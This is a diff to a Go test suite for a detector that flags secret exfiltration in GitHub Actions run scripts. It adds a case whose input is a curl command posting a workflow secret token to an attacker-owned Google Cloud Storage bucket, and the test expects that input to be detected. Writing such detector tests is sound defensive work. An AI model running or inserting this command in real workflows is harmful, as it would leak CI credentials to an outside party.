@@ -92,7 +92,13 @@ func TestSecretExfiltration_CurlWithSecret(t *testing.T) {
   -d "refresh_token=${{ secrets.CWS_REFRESH_TOKEN }}" \
   -d "grant_type=refresh_token"`,
 			wantErrors:  0,
-			description: "Should NOT detect curl to Google's OAuth2 token endpoint (googleapis.com is a legit pattern)",
+			description: "Should NOT detect curl to Google's OAuth2 token endpoint",
+		},
+		{
+			name:        "curl with secret to attacker-controlled Google Cloud Storage bucket",
+			runScript:   `curl -d "secret=${{ secrets.TOKEN }}" https://storage.googleapis.com/attacker-owned-bucket/object`,
+			wantErrors:  1,
+			description: "Should detect secret sent to an attacker-controlled resource on another Google API",
 		},
 		{
 			name:        "curl without secret",
